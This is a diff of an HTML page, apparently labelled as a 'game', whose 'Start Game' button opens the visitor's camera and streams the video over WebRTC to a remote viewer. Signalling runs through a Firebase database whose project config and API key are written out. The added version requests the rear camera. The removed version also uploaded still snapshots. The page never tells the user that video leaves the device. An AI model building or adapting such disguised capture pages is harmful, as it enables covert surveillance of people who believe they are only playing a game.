@@ -1,113 +1,90 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Game Camera</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { 
-      font-family: sans-serif; 
-      display: flex; 
-      flex-direction: column; 
-      align-items: center; 
-      justify-content: center; 
-      height: 100vh; 
-      background:#111; 
-      color:#fff; 
-    }
-    button { 
-      padding: 10px 20px; 
-      font-size: 16px; 
-      border-radius:5px; 
-      border:none; 
-      background:#00aaff; 
-      color:#fff; 
-      cursor:pointer; 
-      margin:5px;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Game Sender</title>
+<style>
+  body {
+    background:#111;
+    color:#fff;
+    font-family:Arial;
+    text-align:center;
+    padding-top:40px;
+  }
+  button {
+    padding:12px 25px;
+    font-size:16px;
+    margin:10px;
+    border:none;
+    border-radius:6px;
+    cursor:pointer;
+    background:#00aaff;
+    color:white;
+  }
+</style>
 </head>
+
 <body>
-  <h1>Game Camera</h1>
-  <button id="start">Start Game</button>
-  <button id="shoot" disabled>Shoot</button> <!-- awalnya disabled -->
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-    import { getDatabase, ref, set, onValue, push, remove } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+<h2>🎮 Game Sender</h2>
 
-    // ===== Firebase Config =====
-    const firebaseConfig = {
-      apiKey: "AIzaSyCMD_qYKFZQZveZQL1NX7oj3oFuTsRxaYI",
-      authDomain: "camera-stream-15427.firebaseapp.com",
-      databaseURL: "https://camera-stream-15427-default-rtdb.firebaseio.com",
-      projectId: "camera-stream-15427",
-      storageBucket: "camera-stream-15427.firebasestorage.app",
-      messagingSenderId: "437543558160",
-      appId: "1:437543558160:web:32a8d80fdcd95b0568fe95"
-    };
+<button id="startBtn">Start Game</button>
+<button id="endBtn">End Game</button>
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    const room = "room1";
-    const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+import { getDatabase, ref, set, onValue, push } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
-    let stream; // simpan stream untuk tombol shoot
-    const startBtn = document.getElementById("start");
-    const shootBtn = document.getElementById("shoot");
+const firebaseConfig = {
+  apiKey: "AIzaSyCMD_qYKFZQZveZQL1NX7oj3oFuTsRxaYI",
+  authDomain: "camera-stream-15427.firebaseapp.com",
+  databaseURL: "https://camera-stream-15427-default-rtdb.firebaseio.com",
+  projectId: "camera-stream-15427",
+  storageBucket: "camera-stream-15427.appspot.com",
+  messagingSenderId: "437543558160",
+  appId: "1:437543558160:web:32a8d80fdcd95b0568fe95"
+};
 
-    // ===== ICE Candidate =====
-    pc.onicecandidate = e => {
-      if(e.candidate) push(ref(db, room+"/candidates"), e.candidate.toJSON());
-    };
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const room = "room1";
 
-    remove(ref(db, room+"/candidates")); // hapus kandidat lama
+let pc;
+let stream;
 
-    // ===== Start Game =====
-    startBtn.onclick = async () => {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({video:true});
-        stream.getTracks().forEach(track => pc.addTrack(track, stream));
+document.getElementById("startBtn").onclick = async () => {
+  pc = new RTCPeerConnection({
+    iceServers: [{ urls:"stun:stun.l.google.com:19302" }]
+  });
 
-        const offer = await pc.createOffer();
-        await pc.setLocalDescription(offer);
-        set(ref(db, room+"/offer"), { type: offer.type, sdp: offer.sdp });
-        console.log("Offer sent!");
+  pc.onicecandidate = e => {
+    if (e.candidate) {
+      push(ref(db, room + "/candidates"), e.candidate.toJSON());
+    }
+  };
 
-        shootBtn.disabled = false; // aktifkan tombol shoot setelah kamera berjalan
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "environment" }
+  });
 
-        // Terima answer dari viewer
-        onValue(ref(db, room+"/answer"), snap => {
-          if(snap.exists()){
-            pc.setRemoteDescription(snap.val()).then(()=>console.log("Answer set!"));
-          }
-        });
+  stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
-      } catch(err) {
-        console.error("Failed to start camera:", err);
-      }
-    };
+  const offer = await pc.createOffer();
+  await pc.setLocalDescription(offer);
+  await set(ref(db, room + "/offer"), offer);
 
-    // ===== Shoot Snapshot =====
-    shootBtn.onclick = () => {
-      if(!stream) return;
+  onValue(ref(db, room + "/answer"), snap => {
+    if (snap.exists()) {
+      pc.setRemoteDescription(snap.val());
+    }
+  });
+};
 
-      const videoTrack = stream.getVideoTracks()[0];
-      const videoEl = document.createElement("video");
-      videoEl.srcObject = new MediaStream([videoTrack]);
-      videoEl.play();
+document.getElementById("endBtn").onclick = () => {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  if (pc) pc.close();
+};
+</script>
 
-      const canvas = document.createElement("canvas");
-      canvas.width = 640; 
-      canvas.height = 480;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL("image/png");
-
-      // Kirim ke Firebase
-      set(ref(db, room + "/snapshot"), { image: imageData, timestamp: Date.now() });
-      console.log("Photo shot sent!");
-    };
-  </script>
 </body>
 </html>
